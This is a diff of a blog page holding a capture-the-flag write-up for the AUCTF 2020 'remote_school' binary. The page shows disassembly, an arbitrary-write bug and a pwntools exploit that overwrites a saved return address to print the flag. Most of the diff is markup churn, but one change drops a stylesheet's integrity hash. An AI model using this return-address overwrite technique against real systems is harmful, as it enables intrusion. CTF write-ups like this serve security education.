@@ -34,10 +34,10 @@
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/solarized-dark.min.css"> 
 
 
-<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css" crossorigin="anonymous">
 
 
-<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css" integrity="sha512-+4zCK9k+qNFUR5X+cKL9EIR+ZOhtIloNl9GIKS57V1MyNsYpYcUrUeQc9vNfzsWfV28IaLL3i96P9sdNyeRssA==" crossorigin="anonymous" />
  
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
@@ -68,7 +68,7 @@
 
 
 <script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
- <meta name="generator" content="Hugo 0.72.0" />
+ <meta name="generator" content="Hugo 0.88.1" />
         
 
         
@@ -113,15 +113,17 @@
                     
                         <ul class="nav navbar-nav navbar-right">
                             
-                                <li class="navbar-icon"><a href="https://github.com/raffaeleflorio/"><i class="fa fa-github"></i></a></li>
+                                <li class="navbar-icon"><a href="https://github.com/raffaeleflorio/"><i class="fab fa-github"></i></a></li>
                             
-                                <li class="navbar-icon"><a href="https://www.linkedin.com/in/raffaele-florio-79967919b/"><i class="fa fa-linkedin"></i></a></li>
+                                <li class="navbar-icon"><a href="https://www.linkedin.com/in/raffaele-florio-79967919b/"><i class="fab fa-linkedin"></i></a></li>
                             
-                                <li class="navbar-icon"><a href="https://instagram.com/r7florio/"><i class="fa fa-instagram"></i></a></li>
+                                <li class="navbar-icon"><a href="https://twitter.com/raffaeleflorio_"><i class="fab fa-twitter"></i></a></li>
                             
-                                <li class="navbar-icon"><a href="/key.asc"><i class="fa fa-key"></i></a></li>
+                                <li class="navbar-icon"><a href="https://hackernoon.com/u/raffaeleflorio"><i class="fas fa-user-astronaut"></i></a></li>
                             
-                                <li class="navbar-icon"><a href="mailto:raffaeleflorio@protonmail.com"><i class="fa fa-envelope-o"></i></a></li>
+                                <li class="navbar-icon"><a href="/key.asc"><i class="fas fa-key"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="mailto:raffaeleflorio@protonmail.com"><i class="fas fa-envelope"></i></a></li>
                             
                         </ul>
                     
@@ -158,13 +160,13 @@
 <p>Best, Dean of Eon Pillars</p>
 </blockquote>
 <p>You could download the binary <a href="/ctf/auctf2020/binary/remote_school">here</a>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ sha256sum remote_school
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ sha256sum remote_school
 d0639347713b54603db5f8015fc1015ca911fb10ad9d271c31e9630093054664  remote_school
 </code></pre></div><h1 id="exploitation">Exploitation</h1>
 <p>At the startup the program prints a banner and it asks a name. As usual I tried to find a buffer overflow or a format string vulnerability, without success.</p>
 <p>Then it prints a prompt. I also played a bit here, without success.</p>
 <p>However the program supports a lot of command:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ./remote_school
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ./remote_school
 Welcome to your new online class!
 We here, at Eon Pillars, we think Zoom is trash and prefer to have our lessions via command line!
 May I get your name?
@@ -187,7 +189,7 @@ quit: Exit Terminal
 What should we <span style="color:#66d9ef">do</span>?
 &gt; <span style="color:#f92672">[</span>? <span style="color:#66d9ef">for</span> menu<span style="color:#f92672">]</span>: 
 </code></pre></div><p>So I analyzed the binary with checksec. It has RWX segment and NX disabled. Weird.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ checksec remote_school
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ checksec remote_school
     Arch:     i386-32-little
     RELRO:    Partial RELRO
     Stack:    No canary found
@@ -195,7 +197,7 @@ What should we <span style="color:#66d9ef">do</span>?
     PIE:      PIE enabled
     RWX:      Has RWX segments
 </code></pre></div><p>Then I opened with radare2 and I found two promising functions:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ r2 -Ad ./remote_school
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ r2 -Ad ./remote_school
 <span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; afl
 .....
 0x5655699f    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">120</span>          sym.class_hacker
@@ -203,7 +205,7 @@ What should we <span style="color:#66d9ef">do</span>?
 .....
 </code></pre></div><p>But there isn’t any xref to both functions.</p>
 <p>However, after some digging, I found an interesting object:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; is
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; is
 .....
 <span style="color:#ae81ff">40</span>   0x00002ec0 0x56558ec0 LOCAL  OBJ    <span style="color:#ae81ff">32</span>        classtable
 .....
@@ -217,7 +219,7 @@ What should we <span style="color:#66d9ef">do</span>?
 0x56558ed8 ..<span style="color:#f92672">[</span> null bytes <span style="color:#f92672">]</span>..   <span style="color:#ae81ff">00000000</span> 
 </code></pre></div><p>It seems like an associative array. So I tried to attend the “Hacker” class, with success.</p>
 <p>This class prints a hexadecimal value (maybe an address) and we got a segfault:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">&gt; <span style="color:#f92672">[</span>? <span style="color:#66d9ef">for</span> menu<span style="color:#f92672">]</span>: attend Hacker
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">&gt; <span style="color:#f92672">[</span>? <span style="color:#66d9ef">for</span> menu<span style="color:#f92672">]</span>: attend Hacker
 
 Welcome!
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -227,7 +229,7 @@ Got AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
 </code></pre></div><p>Let’s disassemble <code>class_hacker</code>.</p>
 <p>It’s a really simple function. It gets the input and then passes it to another function called <code>test</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; pdf @sym.class_hacler
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; pdf @sym.class_hacler
 .....
 │           0x565569d2      <span style="color:#ae81ff">6800200000</span>     push 0x2000
 │           0x565569d7      8d85f8dfffff   lea eax, <span style="color:#f92672">[</span>var_2008h<span style="color:#f92672">]</span>
@@ -242,7 +244,7 @@ Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="c
 <li>It prints the address of <code>ebp</code>. I highlited the line with the THIS comment.</li>
 <li>It gives us an arbitrary write. I also highlited this line with a comment.</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; pdf @sym.test
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; pdf @sym.test
 .....
 |           0x56556559      e842fcffff     call sym.__x86.get_pc_thunk.bx
 │           0x5655655e      81c3a22a0000   add ebx, 0x2aa2
@@ -263,11 +265,11 @@ Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="c
 .....
 </code></pre></div><p>So, with a two step attack, we can overwrite the saved return address (at <code>ebp + 0x4</code>) with the address of <code>print_flag</code>.</p>
 <p>This is the exploit:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python2</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python2</span>
 
 <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
-prog <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(os<span style="color:#f92672">.</span>getcwd() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/online&#34;</span>, checksec<span style="color:#f92672">=</span>False)
+prog <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(os<span style="color:#f92672">.</span>getcwd() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/online&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
 
 <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
 	host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;challenges.auctf.com&#34;</span>
@@ -303,13 +305,13 @@ base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x56555000
 	t<span style="color:#f92672">.</span>sendline(payload)
 
 ebp <span style="color:#f92672">=</span> init()
-log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;ebp @ {:#x}&#34;</span><span style="color:#f92672">.</span>format(ebp))
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;ebp @ </span><span style="color:#e6db74">{:#x}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(ebp))
 print_flag(ebp)
 
 t<span style="color:#f92672">.</span>interactive()
 t<span style="color:#f92672">.</span>close()
 </code></pre></div><p>And this is the flag:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ./exploit.py
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ./exploit.py
 .....
 auctf<span style="color:#f92672">{</span>1_hope_you_l1ked_my_g@m3_2321<span style="color:#f92672">}</span>
 .....
